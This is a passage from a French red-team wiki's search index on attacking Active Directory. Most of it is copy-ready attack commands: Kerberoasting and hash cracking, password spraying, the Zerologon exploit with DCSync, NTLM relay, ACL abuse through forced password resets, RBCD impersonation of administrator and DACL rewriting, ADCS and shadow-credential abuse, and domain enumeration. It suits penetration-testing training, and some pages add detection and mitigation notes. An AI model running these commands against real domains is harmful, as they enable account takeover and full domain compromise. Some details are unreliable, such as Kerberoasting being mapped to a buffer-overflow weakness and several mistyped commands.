\u00e0 leur nom et ainsi de tenter de le cracker pour r\u00e9cup\u00e9rer le password du compte.</p> <p></p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/#powershell","title":"Powershell","text":"<p>Lister les comptes avec un SPN :</p> <pre><code>Get-DomainUser -SPN #powerview\n---\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName #powershell\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/#avec-rubeus","title":"Avec Rubeus :","text":"<pre><code>Rubeus.exe kerberoast /stats\n</code></pre> <p>Request un TGS :</p> <pre><code>Rubeus.exe kerberoast /user:utilisateur /simple\n</code></pre> <p>Request un TGS sans downgrade du chiffrement. Cela permet de ne demander que les SPN avec un chiffrement type RC4_HMAC, ce qui est potentiellement plus stealthy:</p> <pre><code>Rubeus.exe kerberoast /stats /rc4opsec\nRubeus.exe kerberoast /user:utilisateur /simple /rc4opsec\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/#en-net","title":"En .net","text":"<p>Request d'un tgs :</p> <pre><code>Add-Type -AssemblyNAme System.IdentityModel \nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"USSvc/serviceaccount\"\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/#depuis-linux","title":"Depuis linux","text":"<p>Lister les comptes avec un SPN :</p> <pre><code>crackmapexec ldap -u \"user\" -p \"password\" --kerberoastable output.txt\n---\nimpacket-GetUserSPNs -dc-ip $ip -u \"\" -p \"\" $domain/$user\nimpacket-GetUserSPNs -dc-ip $ip $domain/$user -request -outputfile output.txt\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/#cracker-le-tgs","title":"Cracker le tgs :","text":"<pre><code>hashcat -m 13100 '$tgs' /usr/share/wordlist/rockyou.txt\n</code></pre> Cat\u00e9gorie Information TTP T1208 (Kerberoasting) CWE CWE-120 (Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')) Description de l'attaque Kerberoasting exploite la fonctionnalit\u00e9 des tickets de service Kerberos dans les environnements Windows. Les attaquants extraient les tickets de service Kerberos et les craquent hors ligne pour obtenir des mots de passe d'utilisateurs de service faibles. Impacts potentiels - Acc\u00e8s non autoris\u00e9 aux ressources r\u00e9seau- Compromission de comptes de service- \u00c9l\u00e9vation de privil\u00e8ges Comment la d\u00e9tecter - Surveillance des demandes anormales de tickets de service Kerberos- Analyse des journaux pour les tentatives de connexion \u00e9chou\u00e9es fr\u00e9quentes- Utilisation d'outils de d\u00e9tection d'intrusion Rem\u00e9diations/mitigations - Utiliser des mots de passe forts pour les comptes de service- Appliquer la politique de s\u00e9curit\u00e9 Least Privilege- Mettre en \u0153uvre des audits r\u00e9guliers des comptes et des mots de passe- Utiliser Advanced Threat Protection pour surveiller les activit\u00e9s suspectes Lien de r\u00e9f\u00e9rence MITRE ATT&amp;CK - T1208: Kerberoasting"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/LAPS/","title":"LAPS","text":"<p>Pour savoir si LAPS est utilis\u00e9, nous pouvons voir si nous trouvons un fichier AdmPwd.dll dans le dossier\u00a0<code>C:\\Program Files\\LAPS\\CSE</code></p> <p>Pour trouver les utilisateurs ayant le droit de lire les passwords LAPS:</p> <pre><code>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAce -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -math 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}\n</code></pre> <p>Si on compromet un utilisateur ayant le droit de lire les LAPS, on peut lire le password en clair en utilisant :</p> <pre><code>Get-DomainObject -Identity targtmachine$ | select -ExpandProperty ms-mcs-admpwd\n---\nGet-ADComputer -Identity targetmachine -Properties ms-mcs-admpwd | select -ExtandProperty ms-mcs-admpwd\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Password%20et%20hash%20spraying/","title":"Password et hash spraying","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Password%20et%20hash%20spraying/#depuis-linux","title":"Depuis Linux","text":"<p>Utilisation de kerbrute pour faire du password spraying sur une liste d'utilisateur et un password:</p> <pre><code>kerbrute passwordspray -d $domain --dc $ip users.txt  $password\n</code></pre> <p>password spraying via netexec:</p> <pre><code>netexec smb $ip -u users.txt -p $password | grep +\n</code></pre> <p>Hash spraying avec netexec:</p> <pre><code>netexec smb $ip -u users.txt -H hash.txt | grep +\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Password%20et%20hash%20spraying/#depuis-windows","title":"Depuis Windows","text":"<p>https://github.com/dafthack/DomainPasswordSpray</p> <pre><code>Import-Module .\\DomainPasswordSpray.ps1\n\nInvoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre> Cat\u00e9gorie Information TTP Tentatives d'acc\u00e8s par essais de mots de passe communs sur de nombreux comptes CWE CWE-307 (Improper Restriction of Excessive Authentication Attempts) Description de l'attaque Le Password Spraying consiste \u00e0 tester un ou quelques mots de passe courants contre un grand nombre de comptes utilisateurs, r\u00e9duisant ainsi le risque de d\u00e9tection par rapport aux attaques de force brute classiques. Impacts potentiels - Acc\u00e8s non autoris\u00e9 \u00e0 de multiples comptes- Compromission de la s\u00e9curit\u00e9 des informations- Potentiel d'attaques plus larges sur le r\u00e9seau Comment la d\u00e9tecter - Surveillance des tentatives de connexion \u00e9chou\u00e9es sur de nombreux comptes- Analyse des journaux pour identifier les mod\u00e8les d'acc\u00e8s suspects- Utilisation de solutions de d\u00e9tection d'intrusion Rem\u00e9diations/mitigations - Mise en \u0153uvre de l'authentification multi-facteurs (MFA)- Politiques de mots de passe forts et vari\u00e9s- Verrouillage de compte apr\u00e8s un nombre limit\u00e9 de tentatives \u00e9chou\u00e9es- Formation et sensibilisation des utilisateurs sur la s\u00e9curit\u00e9 des mots de passe Lien de r\u00e9f\u00e9rence OWASP - Password Spraying Attack"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Zerologon/","title":"Zerologon","text":"<p>Dans la pratique, la faille Zerologon (CVE-2020-1472) permet \u00e0 un attaquant de prendre le contr\u00f4le d'un contr\u00f4leur de domaine, principalement de deux mani\u00e8res :</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Zerologon/#remplacer-le-hash-du-dc-par-un-hash-null","title":"Remplacer le hash du DC par un hash null","text":"<p>Utilisation de https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py : Cet exploit va remplacer le hash du DC par un hash null, le probl\u00e8me de cette m\u00e9thode est donc que l'AD va vite devenir inutilisable :</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Zerologon/#depuis-linux","title":"Depuis Linux","text":"<p>V\u00e9rifier si le DC est vuln\u00e9rable :</p> <pre><code>netexec smb 10.10.10.10 -u \"\" -p \"\" -M zerologon\n</code></pre> <p>Exploitation de la faille :</p> <pre><code>cve-2020-1472-exploit.py 'nomDuDC' 'adresseIpDuDC'\n</code></pre> <pre><code>netexec smb 10.10.10.10 -u 'DC0$' -p '' --ntds\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Zerologon/#depuis-windows","title":"Depuis Windows","text":"<p>L'exploit peut se faire avec mimikatz :</p> <pre><code>lsadump::zerologon /target:dc.domain.local /account:DC$ /exploit\n</code></pre> <p>Puis on effectue le DCSync :</p> <pre><code>lsadump::dcsync /domain:domain.local /dc:dc.domain.local /user:Administrator /authuser:DC$ /authdomain:domain /authpassword:\"\" /authntlm\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Zerologon/#relais-ntlm","title":"Relais NTLM","text":"<p>La seconde m\u00e9thode, plus \u00e9l\u00e9gante, permet d'utiliser un relais NTLM. Cette m\u00e9thode est plus simple et n'a pas la contrainte de remplacer le mot de passe du DC, n'entrainant donc pas d'instabilit\u00e9 de l'AD.</p> <p>Plusieurs pr\u00e9requis sont n\u00e9anmoins n\u00e9cessaires: - Le service PrintSpooler doit tourner sur le DC - Un compte utilisateur  - Un second DC</p> <p>Mise en place du relais NTLM :</p> <pre><code>ntlmrelayx -t dcsync://DC2 -smb2support\n</code></pre> <pre><code>printerbug.py 'domain.local'/user:Password@ipDC ipAttaquant\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/","title":"ExtendedRight   User Force Change Password","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/#depuis-linux","title":"Depuis Linux","text":"<p>Pour changer le mot de passe d'un utilisateur depuis un environnement Linux, utilisez <code>rpcclient</code> comme suit :</p> <pre><code>rpcclient -U $monUser$ 10.10.10.192\nsetuserinfo2 $userCible$ 23 'password'\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/#depuis-windows","title":"Depuis Windows","text":"<p>Depuis Windows, vous pouvez utiliser PowerShell et le module <code>ActiveDirectory</code> :</p> <pre><code>Set-DomainUserPassword -Identity $userCible -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose\n</code></pre> <p>/!\\ Attention: penser \u00e0 mettre un mot de passe qui soit en accord avec la politique de mot de passe du domaine, sinon celui-ci ne sera pas modifi\u00e9 (et suivant le contexte, aucun message d'erreur) /!\\</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/","title":"GenericAll","text":"<p>Le droit <code>GenericAll</code> permet un contr\u00f4le total sur l'objet cible. Il peut \u00eatre appliqu\u00e9 \u00e0 des utilisateurs, des groupes ou des machines. Voici comment exploiter ce droit dans diff\u00e9rents contextes :</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#genericall-sur-un-utilisateur","title":"GenericAll sur un Utilisateur","text":"<p>Si un utilisateur a le droit <code>GenericAll</code> sur un autre utilisateur, il est possible de r\u00e9initialiser le mot de passe de l'utilisateur cible.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-windows","title":"Depuis Windows","text":"<p>Utilisez la commande suivante pour r\u00e9initialiser le mot de passe d'un utilisateur depuis un environnement Windows :</p> <pre><code>net user $userCible $nouveauPassword /domain\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-linux","title":"Depuis Linux","text":"<p>Depuis un environnement Linux, vous pouvez utiliser la commande suivante :</p> <pre><code>net rpc user password $userCible $nouveauPass -U domain.local/$noreUser -S $dc\n</code></pre> <p>Mettre un mot de passe en ad\u00e9quation avec la politique de mot de passe du domaine, sinon celui-ci ne sera pas attribu\u00e9 et rien ne nous l'indique.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#genericall-sur-un-groupe","title":"GenericAll sur un Groupe","text":"<p>Si un utilisateur a le droit <code>GenericAll</code> sur un groupe, il peut s'ajouter en tant que membre de ce groupe.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-windows_1","title":"Depuis Windows","text":"<p>Utilisez les commandes suivantes pour ajouter un utilisateur \u00e0 un groupe depuis un environnement Windows :</p> <pre><code>net group \"$groupeCible\" $userCible /add /domain #cmd\nAdd-ADGroupMember -Identity \"$groupeCible\" -Members $userCible #powershell\nAdd-ADGroupMember -Identity \"$groupeCible\" -Members $userCible #powersploit\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#genericall-sur-une-machine","title":"GenericAll sur une Machine","text":"<p>Le droit <code>GenericAll</code> sur une machine permet d'abuser de la Resource-Based Constrained Delegation (RBCD).</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-windows_2","title":"Depuis Windows","text":"<p>Pour exploiter ce droit, nous avons besoin des scripts <code>powermad.ps1</code> et <code>powerview</code>.</p> <p>Cr\u00e9ation d'un compte machine :</p> <pre><code>import-module powermad\nNew-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose\n</code></pre> <p>V\u00e9rification de la cr\u00e9ation du compte :</p> <pre><code>Get-DomainComputer\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid\n\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"\n\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n\n$SD.GetBinaryForm($SDBytes, 0)\n\nGet-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n</code></pre> <p>R\u00e9cup\u00e9ration du hash du compte machine cr\u00e9\u00e9 :</p> <pre><code>.\\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>rubeus.exe s4u /user:paked$ /aes256:&lt;aes256&gt; /aes128:&lt;aes128&gt; /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-linux_1","title":"Depuis Linux","text":"<p>Cr\u00e9ation d'un compte machine :</p> <pre><code>impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\\$user:$password'\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/","title":"GenericWrite   GenericAll","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#ajout-dun-spn-pour-kerberoasting","title":"Ajout d'un SPN pour Kerberoasting","text":"<p>Si notre utilisateur a les droits <code>GenericWrite</code> ou <code>GenericAll</code> sur un objet de l'AD, il est possible de mettre un SPN sur cet objet, ce qui le rend par la suite kerberoastable.</p> <p>\u00c9num\u00e9ration des droits de notre utilisateur :</p> <pre><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"notreUser\"}\n</code></pre> <p>Mise en place d'un SPN sur l'utilisateur cible :</p> <pre><code>Set-DomainObject -Identity UtilisateurCible -Set @{serviceprincipalname='us/hackedBro'}\n---\nSet-ADUser -Identity UtilisateurCible -ServicePrincipalNames @{add='us/hackedBro'}\n</code></pre> <p>Kerberoasting de l'utilisateur :</p> <pre><code>Rubeus.exe kerberoast /outfile:target.txt\n</code></pre> <p>Cracking du hash :</p> <pre><code>hashcat '$tgs' /ush/share/wordlist/rockyou.txt\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#changement-direct-de-mot-de-passe-avec-genericall","title":"Changement direct de mot de passe avec <code>GenericAll</code>","text":"<p>Avec le droit <code>GenericAll</code>, il est possible de changer directement le mot de passe de l'objet sur lequel le droit s'applique, mais cette action est beaucoup moins \"safe\" que d'ajouter un SPN :</p> <pre><code>net user userCible password /domain\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#ajout-a-un-groupe-avec-genericall","title":"Ajout \u00e0 un groupe avec <code>GenericAll</code>","text":"<p>Si le droit <code>GenericAll</code> s'applique sur un groupe, il est possible de s'ajouter dans ce groupe :</p> <pre><code>net group \"groupe\" user /add /domain\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#genericwrite-sur-un-compte-machine","title":"GenericWrite sur un compte machine","text":"<p>Ce droit permet d'abuser de la Resource-Based Constrained Delegation (RBCD).</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#depuis-windows","title":"Depuis Windows","text":"<p>Pour exploiter ce droit, nous avons besoin des scripts <code>powermad.ps1</code> et <code>powerview</code>.</p> <p>Cr\u00e9ation d'un compte machine :</p> <pre><code>import-module powermad\nNew-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose\n</code></pre> <p>V\u00e9rification de la cr\u00e9ation du compte :</p> <pre><code>Get-DomainComputer\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid\n\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"\n\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n\n$SD.GetBinaryForm($SDBytes, 0)\n\nGet-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n</code></pre> <p>R\u00e9cup\u00e9ration du hash du compte machine cr\u00e9\u00e9 :</p> <pre><code>.\\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>rubeus.exe s4u /user:paked$ /aes256:&lt;aes256&gt; /aes128:&lt;aes128&gt; /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#depuis-linux","title":"Depuis Linux","text":"<p>Cr\u00e9ation d'un compte machine :</p> <pre><code>impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\\$user:$password'\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/Self-membership%20-%20WriteProperty/","title":"Self membership   WriteProperty","text":"<p>Si notre utilisateur a le droit <code>Self-Membership</code> sur un groupe, alors il est habilit\u00e9 \u00e0 se rajouter lui-m\u00eame en tant que membre de ce groupe.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/Self-membership%20-%20WriteProperty/#depuis-windows","title":"Depuis Windows","text":"<p>Ajouter notre utilisateur au groupe cible :</p> <pre><code>net group \"groupe cible\" $user /add /domain\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ACE%20ACL%20DACL/WriteDACL%20%2B%20WriteOwner/","title":"WriteDACL + WriteOwner","text":"<p>Avec le droit <code>WriteDACL</code>, il est possible d'attribuer soi-m\u00eame des permissions \u00e0 l'objet cible. Le plus simple est donc de s'attribuer le droit <code>GenericAll</code> sur cet objet.</p> <p>[!Attention] Le faire avec PowerView / Le module powershell ActiveDirectory ne semble pas fonctionner correctement, il faut le faire en \u00e9crivant directement sur le LDAP.</p> <p>Attribuer le droit <code>GenericAll</code> \u00e0 l'utilisateur <code>user</code> sur le groupe <code>test</code></p> <pre><code>$ADSI = [ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\"\n\n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"user\")).Translate([System.Security.Principal.SecurityIdentifier])\n\n$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericAll\",\"Allow\"\n\n$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)\n\n$ADSI.psbase.commitchanges()\n</code></pre> <p>Il est maintenant possible d'avoir un contr\u00f4le total du groupe cible.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ADCS/Enumeration/","title":"Enumeration","text":"<p>Utilisation de Certipy-ad ou certify.exe afin d'interragir avec le serveur de certificat.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ADCS/Enumeration/#differentes-vulnerabilites","title":"Diff\u00e9rentes vuln\u00e9rabilit\u00e9s","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ADCS/Enumeration/#linux-certipy-ad","title":"Linux (certipy-ad)","text":"<p>Installation:</p> <pre><code>pip install certipy-ad\n</code></pre> <p>Enum\u00e9ration des certificats:</p> <pre><code>certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128\n\n# Possibilit\u00e9 de r\u00e9cup\u00e9rer les informations pour bloodhound:\n\ncertipy-ad find -u john@corp.local -p Passw0rd -bloodhound -dc-ip 172.16.126.128\n</code></pre> <p>Faire une demande de certificat (ici une demande du certificat User, sur le serveur de certificat corp-DC-CA et l'utilisateur john):</p> <pre><code>certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User\n</code></pre> <p>Si, dans bloodhound, on voit qu'un utilisateur peut \u00e9crire sur l'attribut\u00a0<code>msDS-KeyCredentialLink</code>\u00a0d'un autre compte, il est possible de r\u00e9cup\u00e9rer le hash de cet autre compte (ici John peut \u00e9crire sur Jane):</p> <pre><code>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/ADCS/Enumeration/#windows-certifyexe","title":"Windows (certify.exe)","text":"<p>Enum\u00e9ration des certificats:</p> <pre><code>certify.exe cas\n</code></pre> <p>Enum\u00e9rer les templates:</p> <pre><code>certify.exe find\n</code></pre> <p>Enum\u00e9rer les templates vuln\u00e9rables aux diff\u00e9rentes attaques :</p> <pre><code>certify.exe find /vulnerable\n</code></pre> <p>Demander un certificat:</p> <pre><code>certify.exe /ca:host-serveur-certficat\\DC-CA /template:certificat-vuln /altname:nom-alternatif\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Linux/","title":"Depuis Linux","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Linux/#password-policy","title":"Password policy","text":"<p>Par d\u00e9faut, la politique de mot de passe est souvent configur\u00e9e comme ceci:</p> Policy Default Value Enforce password history 24 days Maximum password age 42 days Minimum password age 1 day Minimum password length 7 Password must meet complexity requirements Enabled Store passwords using reversible encryption Disabled Account lockout duration Not set Account lockout threshold 0 Reset account lockout counter after Not set <p>En ayant des creds valides il est possible d'\u00e9num\u00e9rer la politique de mot de passe avec crackmapexec:</p> <pre><code>crackmapexec smb $ip -u $user -p $pass --pass-pol\n</code></pre> <p>Sans creds valides, possible avec une NULL SESSION. Via rpc:</p> <pre><code>rpcclient -U \"\" -N $ip\nquerydominfo\ngetdompwinfo\n</code></pre> <p>via enum4linux:</p> <pre><code>enum4linux -P $ip\n</code></pre> <p>Parfois il est possible de r\u00e9cup\u00e9rer des infos depuis le LDAP sans avoir de creds valides (anonymous bind). Ce n'est normalement plus le cas de base depuis Windows Server 2003 mais l'option peut avoir \u00e9t\u00e9 activ\u00e9e:</p> <pre><code>ldapsearch -h $ip -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre> <p>En direct depuis un windows:</p> <pre><code>net accounts\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Linux/#users","title":"Users","text":"<p>Sans creds, il peut \u00eatre possible d'avoir une liste d'user via une NULL session \u00e9galement. Via enum4linux:</p> <pre><code>enum4linux -U $ip  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n</code></pre> <p>via rpc:</p> <pre><code>rpcclient -U \"\" -N $ip\nenumdomusers\n</code></pre> <p>via crackmapexec:</p> <pre><code>crackmapexec smb $ip --users\n</code></pre> <p>Comme la politique de mot de passe, il est possible d'avoir une liste d'user si LDAP permet l'anonymous bind. Via ldapsearch:</p> <pre><code>ldapsearch -h $ip -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n</code></pre> <p>Via windapsearch.py:</p> <pre><code>./windapsearch.py --dc-ip $ip -u \"\" -U\n</code></pre> <p>Il est possible de bruteforcer une liste d'utilisateurs via kerbrute. Cette m\u00e9thode a pour avantage de ne pas g\u00e9n\u00e9rer d'event \"failed to log on\" ou \"logon failure\":</p> <pre><code>kerbrute userenum -d inlanefreight.local --dc $ip /opt/wordlist.txt\n</code></pre> <p>Avec des creds valides, il est possibles d'utiliser crackmapexec:</p> <pre><code>sudo crackmapexec smb $ip -u $user -p $password --users\n</code></pre> <p>Avec des creds valides, \u00e9num\u00e9ration des users logg\u00e9s:</p> <pre><code>sudo crackmapexec smb $ip -u $user -p $password --loggedon-users\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Linux/#groupes","title":"groupes","text":"<p>Avec des creds valides, \u00e9num\u00e9ration des groupes pr\u00e9sents sur l'AD:</p> <pre><code>sudo crackmapexec smb $ip -u $user -p $password --groups\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/","title":"Depuis Windows","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/#situational-awareness","title":"Situational awareness","text":"<p>Domaine actuel :</p> <pre><code>Get-Domain #powerview\n---\nGet-ADDomain #powershell\n</code></pre> <p>Objet d'un autre domaine :</p> <pre><code>Get-Domain -Domain test.local #powerview\n---\nGet-ADDomain -Identity test.local #powershell\n</code></pre> <p>Connaitre le SID du domaine :</p> <pre><code>Get-DomainSID #powerview\n---\n(Get-ADDomain).DomainSID #powershell\n</code></pre> <p>Domain policy pour le domaine actuel :</p> <pre><code>Get-DomainPolicyData #powerview\n---\n(Get-DomainPolicyData).systemaccess #powershell\n</code></pre> <p>Domain policy pour un autre domaine :</p> <pre><code>(Get-DomainPolicyData -domain test.local).systemaccess #powershell\n</code></pre> <p>Connaitre le DC du domaine actuel :</p> <pre><code>Get-DomainController #powerview\n---\nGet-ADDomainController #powershell\n</code></pre> <p>Connaitre le DC d'un autre domaine :</p> <pre><code>Get-DomainController -Domain test.local #powerview\n---\nGet-ADDomainController -DomainName test.local -Discover #powershell\n</code></pre> <p>Lister les utilisateurs du domaine :</p> <pre><code>Get-DomainUser #powerview\n---\nGet-ADUser -Filter * -Properties * #powershell\n</code></pre> <p>Connaitre les propri\u00e9t\u00e9s d'un utilisateur en particulier :</p> <pre><code>Get-DomainUser -Identity $utilisateur -Properties * #powerview\n---\nGet-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name #powershell\n</code></pre> <p>Chercher une cha\u00eene de caract\u00e8res dans les attributs d'un utilisateur (ici \"built\") :</p> <pre><code>Get-DomainUser -LDAPFilter \"Description=*built*\" | Select name,Description #powershell\n---\nGet-ADUser -Filter 'Description -Like \"*built*\"' -Properties Description | select name,Description #powershell\n</code></pre> <p>Connaitre la liste des diff\u00e9rents pc dans le domaine actuel :</p> <pre><code>Get-DomainComputer | select Name #powerview\nGet-DomainComputer -OperatingSystem \"windows server 2019 standard\" #powerview\nGet-DomainComputer -Ping #powerview\n---\nGet-AdComputer -Filter * | select Name #powershell\nGet-AdComputer -Filter 'OperatingSystem -like \"*Windows Server 2019 Standard*\"' -Properties OperatingSystem | select Name,OperatingSystem #powershell\nGet-AdComputer -Filter * -Properties DNSHostName | %(Test-Connection -Count 1 -ComputerName $_.DNSHostName) #powershell\nGet-AdComputer -Filter * -Properties * #powershell\n</code></pre> <p>Connaitre tout les groupes du domaine :</p> <pre><code>Get-DomainGroup | select Name 